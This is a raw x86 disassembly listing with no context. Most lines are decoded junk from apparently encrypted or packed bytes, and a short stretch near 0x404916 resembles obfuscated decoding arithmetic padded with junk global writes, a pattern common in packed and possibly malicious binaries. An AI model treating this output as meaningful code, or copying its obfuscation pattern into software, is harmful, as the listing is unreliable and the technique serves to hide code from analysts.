  4041d9:	xor    BYTE PTR [edi],bh
  4041db:	push   edx
  4041dc:	repnz mov ah,0xf7
  4041df:	mov    ecx,0x3aaf2d32
  4041e4:	xchg   esi,eax
  4041e5:	inc    edi
  4041e6:	dec    ebp
  4041e7:	and    edi,DWORD PTR [ebx+ebp*8-0x5c]
  4041eb:	hlt    
  4041ec:	mov    dh,0x6c
  4041ee:	test   al,0x82
  4041f0:	idiv   BYTE PTR [eax+0x6e]
  4041f3:	enter  0x768a,0x67
  4041f7:	in     al,0x56
  4041f9:	xchg   ebp,eax
  4041fa:	test   eax,0xe4733d7a
  4041ff:	rcr    DWORD PTR [edx-0x3758be7e],cl
  404205:	adc    DWORD PTR [ecx-0x22903cd4],eax
  40420b:	dec    eax
  40420c:	es (bad) 
  40420e:	jno    0x4041ef
  404210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404211:	mov    ebp,DWORD PTR [esi+0x21]
  404214:	loopne 0x404253
  404216:	cli    
  404217:	dec    edx
  404218:	xchg   BYTE PTR [edx],ch
  40421a:	mov    edi,0xbae60c5f
  40421f:	mov    bl,BYTE PTR [edx+0x34728cf2]
  404225:	mov    cl,0xf1
  404227:	fild   QWORD PTR [ebp-0x556a16df]
  40422d:	loop   0x4041e7
  40422f:	add    al,BYTE PTR [eax]
  404231:	sbb    ebp,eax
  404233:	ret    0xacad
  404236:	push   ecx
  404237:	aaa    
  404238:	and    BYTE PTR [eax-0x7d],al
  40423b:	clc    
  40423c:	inc    eax
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	mov    db6,esp
  40425a:	test   BYTE PTR [eax+0x4f],cl
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0x3f70707d
  404265:	push   ebx
  404266:	dec    ebx
  404267:	xor    bl,al
  404269:	jp     0x40422f
  40426b:	sub    al,0xb8
  40426d:	test   ebp,eax
  40426f:	in     eax,dx
  404270:	jmp    0x404203
  404272:	(bad)  
  404273:	mov    WORD PTR [ecx+0x5a47f822],fs
  404279:	test   eax,0xce8b215e
  40427e:	sub    BYTE PTR [ebp+0x3df7f267],0x89
  404285:	dec    esi
  404287:	jno    0x404259
  404289:	clc    
  40428a:	inc    esp
  40428b:	into   
  40428c:	ret    0xe45
  40428f:	adc    bl,BYTE PTR [eax]
  404291:	int3   
  404292:	pop    ecx
  404293:	std    
  404294:	imul   eax,DWORD PTR [ebp+0x35],0x87e5c692
  40429b:	mov    ebp,0x3c5979a5
  4042a0:	imul   eax,edi,0x58eb98aa
  4042a6:	repz adc eax,0xe140059a
  4042ac:	leave  
  4042ad:	das    
  4042ae:	dec    ebx
  4042af:	ins    DWORD PTR es:[edi],dx
  4042b0:	sbb    BYTE PTR [edx],0x8c
  4042b3:	xchg   edx,eax
  4042b4:	xchg   DWORD PTR [edi*2+0x7b7af6a2],eax
  4042bb:	scas   eax,DWORD PTR es:[edi]
  4042bc:	xor    eax,0x30118888
  4042c1:	inc    eax
  4042c2:	jp     0x404288
  4042c4:	dec    ebp
  4042c5:	pop    esp
  4042c6:	fstp   QWORD PTR [esp+ebx*4+0x7e]
  4042ca:	adc    al,0x97
  4042cc:	mov    dh,0xab
  4042ce:	out    dx,al
  4042cf:	cdq    
  4042d0:	stos   DWORD PTR es:[edi],eax
  4042d1:	jge    0x4042ef
  4042d3:	cdq    
  4042d4:	jmp    0xb1e9:0x7c55f128
  4042db:	xor    al,0x1c
  4042dd:	sub    DWORD PTR [esi-0x5e],ebp
  4042e0:	push   cs
  4042e1:	mov    al,bl
  4042e3:	shl    DWORD PTR [eax],0xbb
  4042e6:	bound  ebx,QWORD PTR [ebx+0x18]
  4042e9:	inc    esp
  4042ea:	pop    ebx
  4042eb:	mov    fs,WORD PTR [ebp+0x5a]
  4042ee:	out    dx,al
  4042ef:	push   esi
  4042f0:	mov    ecx,0x20cd477e
  4042f5:	sahf   
  4042f6:	arpl   bx,bx
  4042f8:	jge    0x404348
  4042fa:	in     eax,0x50
  4042fc:	dec    ebx
  4042fd:	xor    BYTE PTR [ecx],cl
  4042ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404300:	js     0x4042a1
  404302:	sbb    BYTE PTR [ebp-0x219e90da],ah
  404308:	cmp    al,0xdb
  40430a:	cli    
  40430b:	test   BYTE PTR [edx-0x1a],bl
  40430e:	cmp    dh,al
  404310:	push   ds
  404311:	stos   BYTE PTR es:[edi],al
  404312:	test   eax,0x43c6236
  404317:	inc    ebp
  404318:	es adc eax,0xf34e199
  40431e:	jmp    0x33be:0x5ef56963
  404325:	fldcw  WORD PTR [edx]
  404327:	adc    eax,0x2de91b9a
  40432c:	dec    eax
  40432d:	leave  
  40432e:	in     eax,dx
  40432f:	pushf  
  404330:	jnp    0x404303
  404332:	pop    esp
  404333:	aam    0x45
  404335:	test   eax,0x3aeb0095
  40433a:	ret    
  40433b:	bnd jo 0x4042fc
  40433e:	inc    edi
  40433f:	push   ebx
  404340:	stos   DWORD PTR es:[edi],eax
  404341:	xor    eax,0x7d4cfb87
  404346:	jge    0x40432a
  404348:	adc    eax,0x52f62cf8
  40434d:	scas   eax,DWORD PTR es:[edi]
  40434e:	iret   
  40434f:	(bad)
  404353:	in     al,0xd5
  404355:	lea    esi,ds:0xa9fb8c64
  40435b:	int    0xe1
  40435d:	in     al,0x8a
  40435f:	xchg   DWORD PTR [esp+esi*2+0x3a03238],eax
  404366:	fwait
  404367:	loopne 0x40435c
  404369:	xor    al,BYTE PTR [edi]
  40436b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40436c:	pop    ecx
  40436d:	jmp    0x39a:0x2fdc85af
  404374:	add    DWORD PTR [edx-0x24052251],esi
  40437a:	neg    bl
  40437c:	js     0x40435b
  40437e:	sub    eax,0xed29e3f4
  404383:	jl     0x40436b
  404385:	mov    cl,0x29
  404387:	mov    ecx,eax
  404389:	push   ds
  40438a:	dec    ebp
  40438b:	hlt    
  40438c:	jbe    0x40435d
  40438e:	add    BYTE PTR [esi-0x66],ch
  404391:	clc    
  404392:	push   eax
  404393:	sbb    edx,ebp
  404395:	dec    edx
  404396:	cli    
  404397:	adc    al,0x2e
  404399:	jg     0x4043c1
  40439b:	inc    edx
  40439c:	sbb    al,BYTE PTR [edx]
  40439e:	mov    ah,0xb2
  4043a0:	inc    ebx
  4043a1:	mov    ds:0xce915455,al
  4043a6:	dec    esi
  4043a7:	sub    DWORD PTR [edi+esi*8],eax
  4043aa:	stos   BYTE PTR es:[edi],al
  4043ab:	sti    
  4043ac:	mov    ebp,esp
  4043ae:	lods   eax,DWORD PTR ds:[esi]
  4043af:	xchg   ebp,eax
  4043b0:	bound  ecx,QWORD PTR [edx]
  4043b2:	inc    esp
  4043b3:	call   0x4fe9ea58
  4043b8:	ss sbb dh,cl
  4043bb:	test   BYTE PTR [esi-0x47205ee3],al
  4043c1:	cmp    ah,0x5f
  4043c4:	xor    DWORD PTR [edi],0xa18ea834
  4043ca:	jbe    0x4043c1
  4043cc:	sar    DWORD PTR [ecx],0x2f
  4043cf:	ins    DWORD PTR es:[edi],dx
  4043d0:	aas    
  4043d1:	ror    DWORD PTR [ebp-0x26fe59f1],cl
  4043d7:	adc    dh,BYTE PTR [ebx+0x31]
  4043da:	adc    edi,DWORD PTR [edx-0x1a]
  4043dd:	jg     0x40437c
  4043df:	xchg   ebp,eax
  4043e0:	into   
  4043e1:	out    0xf9,eax
  4043e3:	cld    
  4043e4:	dec    ebx
  4043e5:	and    esi,DWORD PTR [edi]
  4043e7:	ret    0xf5e2
  4043ea:	jbe    0x404373
  4043ec:	in     eax,0x60
  4043ee:	cli    
  4043ef:	push   ss
  4043f0:	arpl   WORD PTR [edi*2-0x453acc8e],bp
  4043f7:	mov    ah,0x3a
  4043f9:	xchg   ebx,eax
  4043fa:	xchg   ecx,eax
  4043fb:	test   DWORD PTR [ecx+0x4825b3ec],edx
  404401:	fiadd  WORD PTR [ebp+0x2423e61b]
  404407:	pop    es
  404408:	mov    eax,ds:0xf24454e3
  40440d:	retf   
  40440e:	add    DWORD PTR [esi],0xffffffe0
  404411:	or     eax,0x9e6d88a
  404416:	xor    DWORD PTR [edx+0x14],eax
  404419:	mov    ebp,0xabad35cb
  40441e:	jecxz  0x40448c
  404420:	out    dx,eax
  404421:	stos   DWORD PTR es:[edi],eax
  404422:	push   ebp
  404423:	je     0x4043b9
  404425:	sub    eax,0x80bc705f
  40442a:	fnstenv [ecx+0x3a]
  40442d:	loop   0x4043af
  40442f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404431:	ret    0x8325
  404434:	sti    
  404435:	loop   0x40448c
  404437:	dec    edi
  404438:	test   eax,0xc36350c8
  40443d:	ret    0x220c
  404440:	leave  
  404441:	popf   
  404442:	inc    eax
  404443:	test   BYTE PTR [edx-0x70125af4],dl
  404449:	pop    es
  40444a:	loope  0x404421
  40444c:	fisub  DWORD PTR [esi]
  40444e:	arpl   WORD PTR [eax+ecx*4],cx
  404451:	pop    ds
  404452:	pop    ecx
  404453:	fsub   QWORD PTR [edi]
  404455:	dec    ebp
  404456:	mov    ds:0xe0deccb8,al
  40445b:	push   eax
  40445c:	jae    0x404465
  40445e:	outs   dx,DWORD PTR ds:[esi]
  40445f:	sub    eax,0x619f7ac8
  404464:	(bad)  
  404465:	repnz pop eax
  404467:	or     eax,0xc6a0fe02
  40446c:	mov    esi,0xbc373f97
  404471:	dec    esi
  404472:	add    DWORD PTR [esi],esi
  404474:	in     eax,dx
  404475:	cmp    BYTE PTR [eax+0x60761845],bh
  40447b:	iret   
  40447c:	jg     0x404429
  40447e:	daa    
  40447f:	cmp    bl,BYTE PTR [ebp-0x56711648]
  404485:	xor    esp,DWORD PTR es:0x7b2bd176
  40448c:	jb     0x404446
  40448e:	scas   al,BYTE PTR es:[edi]
  40448f:	inc    DWORD PTR [eax-0x7b883188]
  404495:	mov    ecx,0xa5f2791c
  40449a:	cwde   
  40449b:	mov    es,WORD PTR ds:0xa1f6273a
  4044a1:	nop
  4044a2:	mov    ebx,0x4676e198
  4044a7:	pop    eax
  4044a8:	mov    edi,0x998b1e89
  4044ad:	mov    dl,0xae
  4044af:	mov    eax,0x6985bcb7
  4044b4:	mov    DWORD PTR [ebp+0x5c8d27fe],esp
  4044ba:	je     0x40448c
  4044bc:	jmp    0x96cc:0xd57fda98
  4044c3:	ins    DWORD PTR es:[edi],dx
  4044c4:	fs inc esp
  4044c6:	sub    DWORD PTR [ebx-0x11],esi
  4044c9:	mov    ebp,0xe13a026f
  4044ce:	xor    eax,DWORD PTR [edx]
  4044d0:	std    
  4044d1:	sub    al,0x27
  4044d3:	pop    ebp
  4044d4:	mov    edi,?
  4044d6:	jno    0x40447e
  4044d8:	sub    eax,0x8abc4930
  4044dd:	fstp   QWORD PTR [edi+0x281db5be]
  4044e3:	loopne 0x4044f8
  4044e5:	push   esp
  4044e6:	add    al,0x56
  4044e8:	add    ecx,eax
  4044ea:	lahf   
  4044eb:	retf   
  4044ec:	and    DWORD PTR [ebp+ebx*8+0x33],ebx
  4044f0:	sti    
  4044f1:	lock je 0x404530
  4044f4:	mov    WORD PTR [edi+ecx*1],?
  4044f7:	and    al,cl
  4044f9:	or     cl,bh
  4044fb:	stos   BYTE PTR es:[edi],al
  4044fc:	test   BYTE PTR ds:0xc16f1e40,0xbb
  404503:	mov    eax,0x36d93d5b
  404508:	loopne 0x4044f1
  40450a:	ds into 
  40450c:	inc    ecx
  40450d:	loopne 0x4044a6
  40450f:	dec    ebx
  404510:	bt     eax,ebp
  404513:	sbb    bh,ch
  404515:	jno    0x4044ab
  404517:	xchg   BYTE PTR [eax+eiz*2-0x4b],ah
  40451b:	push   esp
  40451c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451d:	pop    ecx
  40451e:	mov    dl,0x4e
  404520:	jae    0x40452f
  404522:	(bad)  
  404523:	mul    DWORD PTR [edi-0x5a]
  404526:	jb     0x404512
  404528:	ja     0x40457d
  40452a:	pushf  
  40452b:	inc    ebx
  40452c:	push   ss
  40452d:	rol    BYTE PTR [ecx],cl
  40452f:	xor    eax,0x20e496c7
  404534:	jge    0x40458d
  404536:	cmovno ecx,esi
  404539:	cs inc eax
  40453b:	(bad)  
  40453d:	push   es
  40453e:	pop    ebx
  40453f:	dec    edx
  404540:	add    DWORD PTR [edx+ebp*2-0x440ec488],0xffffffbe
  404548:	push   ds
  404549:	push   ss
  40454a:	pop    edx
  40454b:	xlat   BYTE PTR ds:[ebx]
  40454c:	dec    eax
  40454d:	jae    0x404587
  40454f:	in     al,dx
  404550:	push   edi
  404551:	xchg   edx,eax
  404552:	out    dx,eax
  404553:	lock xchg esp,eax
  404555:	scas   al,BYTE PTR es:[edi]
  404556:	or     DWORD PTR [ebx+0x34],esi
  404559:	add    eax,0x209890a
  40455e:	sbb    BYTE PTR [ebx+0x6429f0da],dh
  404564:	pop    esp
  404565:	ins    DWORD PTR es:[edi],dx
  404566:	jg     0x404527
  404568:	test   BYTE PTR [ebx-0x3b],ch
  40456b:	in     al,0xb5
  40456d:	cdq    
  40456e:	sti    
  40456f:	add    edx,ebx
  404571:	jecxz  0x4045b2
  404573:	adc    cl,BYTE PTR [ebx]
  404575:	jp     0x404515
  404577:	xchg   BYTE PTR [eax],bh
  404579:	xor    dh,BYTE PTR [esi-0x80]
  40457c:	dec    ebp
  40457d:	or     eax,0xa23baf05
  404582:	push   edi
  404583:	sbb    DWORD PTR [edi+0x43],ebp
  404586:	fstp   QWORD PTR [edi+ebp*8]
  404589:	pop    ecx
  40458a:	retf   
  40458b:	je     0x40459e
  40458d:	adc    al,0xba
  40458f:	mov    esi,0x9e43430
  404594:	push   ds
  404595:	and    bl,BYTE PTR [edi+0x2a]
  404598:	sbb    esp,DWORD PTR [eax+0x19]
  40459b:	(bad)  
  40459c:	aad    0xca
  40459e:	pusha  
  40459f:	sbb    ebx,esi
  4045a1:	mov    dh,0xbf
  4045a3:	loop   0x40461f
  4045a5:	enter  0xf48,0x82
  4045a9:	adc    ecx,edi
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	js     0x4045d1
  4045c9:	and    DWORD PTR [ebp+0x7070240c],ebx
  4045cf:	cmp    eax,0x7b70707d
  4045d4:	mov    ebx,0xb87ee2a
  4045d9:	mov    ?,edi
  4045db:	push   edx
  4045dc:	push   eax
  4045dd:	add    eax,0x1171854a
  4045e2:	test   DWORD PTR [ebx-0x48cf96d0],edi
  4045e8:	mov    DWORD PTR [eax+0x35946bd2],ecx
  4045ee:	arpl   WORD PTR [edi+edi*8-0x3b],bx
  4045f2:	stc    
  4045f3:	sbb    al,0x60
  4045f5:	pushf  
  4045f6:	and    BYTE PTR [eax-0x474b3b2e],0x94
  4045fd:	rcl    BYTE PTR [esi],0x60
  404600:	jbe    0x404642
  404602:	xor    al,0x69
  404604:	test   BYTE PTR [edi],bh
  404606:	enter  0xb70f,0x2c
  40460a:	cmp    esp,DWORD PTR [edi-0x6a752e96]
  404610:	sbb    cl,al
  404612:	addr16 into 
  404614:	es dec edx
  404616:	cli    
  404617:	jae    0x404675
  404619:	xor    eax,0x8685f5c
  40461e:	loop   0x404694
  404620:	sti    
  404621:	or     BYTE PTR [ecx],dl
  404623:	cli    
  404624:	outs   dx,BYTE PTR ds:[esi]
  404625:	jecxz  0x404609
  404627:	mov    ebp,0xae720086
  40462c:	xchg   DWORD PTR [edi+0x40],edi
  40462f:	scas   eax,DWORD PTR es:[edi]
  404630:	fist   DWORD PTR [ebp-0x719580d8]
  404636:	test   BYTE PTR [ebp+edx*2-0x303c56c2],dh
  40463d:	int3   
  40463e:	add    eax,0x6f4bcbb
  404643:	inc    edx
  404644:	inc    ebp
  404645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404646:	int3   
  404647:	lock arpl WORD PTR [ebx],bx
  40464a:	and    eax,0x89f27aa9
  40464f:	sub    eax,0xac9cbbb
  404654:	lock gs test eax,0xea682b9
  40465b:	pop    ecx
  40465c:	ja     0x404613
  40465e:	loope  0x404630
  404660:	xchg   edi,eax
  404661:	jl     0x4046cb
  404663:	inc    ecx
  404664:	in     eax,0x7a
  404666:	xor    ah,BYTE PTR ds:0xf71d620b
  40466c:	jae    0x404658
  40466e:	adc    BYTE PTR [ebp+0x4e],ch
  404671:	out    0x49,eax
  404673:	mov    eax,DWORD PTR [ebx-0x3d]
  404676:	adc    DWORD PTR [ecx],0xffffffd6
  404679:	push   ebx
  40467a:	jb     0x40465b
  40467c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40467d:	lds    ebp,FWORD PTR [esi]
  40467f:	das    
  404680:	scas   al,BYTE PTR es:[edi]
  404681:	call   0x7578:0xc88c6af0
  404688:	sbb    eax,0x54e42a95
  40468d:	(bad)  
  40468e:	and    ebp,DWORD PTR [eax]
  404690:	popa   
  404691:	fstp   QWORD PTR [edx+0xe]
  404694:	shl    BYTE PTR [ebx+ecx*4-0x2026c796],0x1c
  40469c:	in     eax,0x3c
  40469e:	push   es
  40469f:	push   es
  4046a0:	pop    ecx
  4046a1:	fnstcw WORD PTR [esi+0x268fe6d5]
  4046a7:	xor    esp,ebx
  4046a9:	shl    ch,cl
  4046ab:	sub    al,0x5f
  4046ad:	test   al,0xc7
  4046af:	mov    bh,al
  4046b1:	out    0xf3,al
  4046b3:	jl     0x404674
  4046b5:	aad    0xf0
  4046b7:	cdq    
  4046b8:	push   cs
  4046b9:	xchg   ecx,eax
  4046ba:	in     eax,dx
  4046bb:	jge    0x404717
  4046bd:	std    
  4046be:	and    eax,0xbcec94f9
  4046c3:	push   cs
  4046c4:	out    dx,eax
  4046c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c6:	outs   dx,DWORD PTR ds:[esi]
  4046c7:	daa    
  4046c8:	lahf   
  4046c9:	cs and BYTE PTR fs:[ebx+0x3e88132c],bl
  4046d1:	retf   0xd37f
  4046d4:	aas    
  4046d5:	pop    esi
  4046d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046d7:	outs   dx,DWORD PTR ds:[esi]
  4046d8:	push   ebp
  4046d9:	jns    0x40469b
  4046db:	xor    al,0xe9
  4046dd:	jecxz  0x4046b6
  4046df:	int    0x39
  4046e1:	dec    edx
  4046e2:	fstp   DWORD PTR [esi+0x3cdd1bc8]
  4046e8:	neg    BYTE PTR [ecx+0x3b]
  4046eb:	js     0x4046c1
  4046ed:	rol    BYTE PTR [ecx],1
  4046ef:	jne    0x4046ce
  4046f1:	je     0x404712
  4046f3:	inc    eax
  4046f4:	dec    eax
  4046f5:	mov    ch,0x4e
  4046f7:	iret   
  4046f8:	add    al,0xe8
  4046fa:	stc    
  4046fb:	test   ch,ch
  4046fd:	xlat   BYTE PTR ds:[ebx]
  4046fe:	mov    dl,0xe9
  404700:	jb     0x4046fa
  404702:	push   eax
  404703:	in     al,0x9d
  404705:	outs   dx,DWORD PTR ds:[esi]
  404706:	adc    eax,0xd295a001
  40470b:	mov    bl,0x72
  40470d:	add    ebp,DWORD PTR [ebp*2+0x533dd100]
  404714:	or     eax,0x91a201e8
  404719:	js     0x404705
  40471b:	push   ds
  40471c:	in     eax,dx
  40471d:	dec    esp
  40471e:	int    0x51
  404720:	lds    eax,FWORD PTR [ebp+0x1e]
  404723:	xchg   ebx,eax
  404724:	xor    al,0xa7
  404726:	add    dl,BYTE PTR [edx-0x5cf50943]
  40472c:	(bad)  
  40472d:	mov    al,ds:0x14845013
  404732:	loop   0x4046f5
  404734:	xchg   DWORD PTR ds:0xd1be6b2b,esp
  40473a:	pop    esi
  40473b:	mov    ds:0x78eb0ec0,al
  404740:	mov    ds:0xab7a1912,al
  404745:	mov    BYTE PTR [eax-0x68],dl
  404748:	xor    bl,BYTE PTR [ebx-0x14]
  40474b:	std    
  40474c:	aas    
  40474d:	(bad)  
  40474f:	jmp    0x3089:0xbb16bb2d
  404756:	cmc    
  404757:	push   0xbd264f7f
  40475c:	mov    esp,0xc04b863
  404761:	mov    ds:0x37665818,al
  404766:	mov    ah,BYTE PTR [edi+esi*2]
  404769:	mov    cl,0x18
  40476b:	(bad)  
  40476e:	jo     0x404792
  404770:	jnp    0x404701
  404772:	sub    eax,DWORD PTR [edi+0x44287bb9]
  404778:	test   DWORD PTR [edi],esi
  40477a:	add    DWORD PTR [edx+ebx*2],ebx
  40477d:	pop    ebp
  40477e:	push   ebp
  40477f:	sbb    BYTE PTR [ebx+ebx*2-0x4a230829],dl
  404786:	rcl    ebp,0xcd
  404789:	pop    esp
  40478a:	or     BYTE PTR [ebx+edx*4-0x4633f035],0x29
  404792:	lea    esp,[ecx-0xd]
  404795:	scas   al,BYTE PTR es:[edi]
  404796:	fcmovnbe st,st(5)
  404798:	lock mov ss:0x5359c42c,eax
  40479f:	sbb    BYTE PTR [ecx+ebx*1+0xa],dh
  4047a3:	or     BYTE PTR [ebp+0x7d],0x51
  4047a7:	sbb    DWORD PTR [edx],ebp
  4047a9:	ins    BYTE PTR es:[edi],dx
  4047aa:	fisttp QWORD PTR [eax]
  4047ac:	dec    ebx
  4047ad:	sti    
  4047ae:	repnz xchg ebx,eax
  4047b0:	pop    ecx
  4047b1:	mov    ds:0xb5b7bcde,al
  4047b6:	repz xor DWORD PTR es:[eax],edi
  4047ba:	je     0x404787
  4047bc:	xor    ebx,esp
  4047be:	inc    esi
  4047bf:	call   0x8949:0x6ab7bb95
  4047c6:	inc    esi
  4047c7:	jg     0x40482e
  4047c9:	cmp    DWORD PTR [ecx+0x35],esp
  4047cc:	out    dx,al
  4047cd:	popa   
  4047ce:	sbb    DWORD PTR [esi+0x4b],edx
  4047d1:	push   cs
  4047d2:	push   0x683380c0
  4047d7:	call   0xf3e0d7fd
  4047dc:	hlt    
  4047dd:	lods   ax,WORD PTR ds:[esi]
  4047df:	repnz shr BYTE PTR [ebx+0x26e0b593],1
  4047e6:	or     BYTE PTR [edx-0x1234b42d],bh
  4047ec:	ins    BYTE PTR es:[edi],dx
  4047ed:	pushf  
  4047ee:	xor    al,0xc9
  4047f0:	jnp    0x404868
  4047f2:	test   esi,esi
  4047f4:	lods   al,BYTE PTR ds:[esi]
  4047f5:	xchg   edx,eax
  4047f6:	(bad)  
  4047f7:	ja     0x4047db
  4047f9:	test   eax,0x93b56178
  4047fe:	cmovno edx,DWORD PTR [eax-0x31]
  404802:	scas   al,BYTE PTR es:[edi]
  404803:	or     ah,BYTE PTR [ecx-0x3835f9bf]
  404809:	xchg   esi,eax
  40480a:	jo     0x4047c4
  40480c:	(bad)
  40480f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  404811:	test   edi,ebp
  404813:	lds    ebx,FWORD PTR [ebp-0x4ebec568]
  404819:	adc    ch,BYTE PTR [eax+0x7]
  40481c:	lods   eax,DWORD PTR ds:[esi]
  40481d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40481e:	(bad)  
  40481f:	adc    ebx,0xf8365581
  404825:	ficom  DWORD PTR [esi]
  404827:	dec    esi
  404828:	or     ebp,edx
  40482a:	sub    ecx,eax
  40482c:	or     BYTE PTR [edi+edx*1+0x10],ah
  404830:	enter  0xc6fc,0x38
  404834:	sub    al,0x81
  404836:	and    al,0xe3
  404838:	fld    DWORD PTR [eax-0x6f]
  40483b:	inc    ebp
  40483c:	outs   dx,DWORD PTR ds:[esi]
  40483d:	mov    ebp,?
  40483f:	les    edx,FWORD PTR [eax-0x2a74d881]
  404845:	pop    edi
  404846:	hlt    
  404847:	sbb    ebx,DWORD PTR [eax-0x66]
  40484a:	shl    DWORD PTR [edx-0x59c871ae],0xdb
  404851:	sar    DWORD PTR [eax+edi*4],1
  404854:	jo     0x4047fa
  404856:	rol    DWORD PTR [edi+0x1604e81d],0xcc
  40485d:	into   
  40485e:	adc    ch,BYTE PTR [edi]
  404860:	inc    DWORD PTR [ebx]
  404862:	and    al,0x1d
  404864:	jns    0x4048de
  404866:	int3   
  404867:	les    edi,FWORD PTR [edi+0x7e0e2661]
  40486d:	(bad)
  404871:	cmp    ah,BYTE PTR [edx+0x1b]
  404874:	add    BYTE PTR [ecx+0x2e],cl
  404877:	pushf  
  404878:	js     0x4048d0
  40487a:	jno    0x404810
  40487c:	pop    esp
  40487d:	or     edi,esi
  40487f:	arpl   WORD PTR [ecx],sp
  404881:	xchg   DWORD PTR [ecx],ebp
  404883:	inc    ebp
  404884:	shl    DWORD PTR [ecx],cl
  404886:	paddsb mm6,QWORD PTR [edx-0x1d]
  40488a:	sbb    BYTE PTR ss:[edx+0x2d],dl
  40488e:	shl    BYTE PTR [eax+0x799d8de9],cl
  404894:	popf   
  404895:	jg     0x4048bd
  404897:	xchg   BYTE PTR [esi+edi*4+0x29],ah
  40489b:	mov    al,ds:0xa7c87d35
  4048a0:	mov    ebp,0xce217ebc
  4048a5:	inc    edi
  4048a7:	addr16 pop ds
  4048a9:	arpl   WORD PTR [edi],si
  4048ab:	and    dl,al
  4048ad:	mov    ds:0x2d4b1bef,al
  4048b2:	sbb    ebx,0xaf494c77
  4048b8:	(bad)  
  4048ba:	and    edi,ebx
  4048bc:	dec    ebx
  4048bd:	and    eax,0xd39f90a7
  4048c2:	daa    
  4048c3:	jmp    0x50d2:0x91b6a4d9
  4048ca:	test   BYTE PTR [ecx-0x65b50c2c],dh
  4048d0:	xor    BYTE PTR [esi],ah
  4048d2:	sbb    BYTE PTR [edi+ebp*8-0x71ec2af4],dl
  4048d9:	loope  0x404928
  4048db:	pop    ss
  4048dc:	push   eax
  4048dd:	mov    WORD PTR [ebx],?
  4048df:	pop    esi
  4048e0:	cmp    DWORD PTR [edx+edx*2-0x17],eax
  4048e4:	push   edx
  4048e5:	loope  0x40493f
  4048e7:	test   al,0xa6
  4048e9:	neg    DWORD PTR [ebp-0x45]
  4048ec:	sbb    ebp,DWORD PTR gs:[edx]
  4048ef:	inc    eax
  4048f0:	ret    
  4048f1:	jmp    0x40494b
  4048f3:	cs (bad) 
  4048f5:	mov    bl,0x21
  4048f7:	xchg   ebx,eax
  4048f8:	pop    esi
  4048f9:	inc    ebp
  4048fa:	sbb    bl,BYTE PTR [esi]
  4048fc:	jmp    0x52af:0xd165a9e7
  404903:	jo     0x40497c
  404905:	xchg   DWORD PTR [esi+0x52],esp
  404908:	mov    eax,ds:0xe58ad03d
  40490d:	hlt    
  40490e:	adc    BYTE PTR [edx+0x4b],al
  404911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404912:	sti    
  404913:	pop    eax
  404914:	outs   dx,DWORD PTR ds:[esi]
  404915:	outs   dx,BYTE PTR ds:[esi]
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	ffreep st(6)
  4049bd:	dec    ebx
  4049be:	push   ecx
  4049bf:	leave  
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x6970707d
  4049c8:	cdq    
  4049c9:	shr    DWORD PTR [ecx+0x36],0x67
  4049cd:	arpl   WORD PTR [eax+0x3f8b0ebc],di
  4049d3:	sub    BYTE PTR [ebx+0x58544436],al
  4049d9:	(bad)  
  4049da:	out    0xf,eax
  4049dc:	loopne 0x4049e6
  4049de:	scas   eax,DWORD PTR es:[edi]
  4049df:	mov    edi,eax
  4049e1:	iret   
  4049e2:	xchg   esp,eax
  4049e3:	mov    ah,0xfd
  4049e5:	push   ebx
  4049e6:	pop    esi
  4049e7:	mov    cl,BYTE PTR [esi]
  4049e9:	xchg   ebx,eax
  4049ea:	and    bh,ch
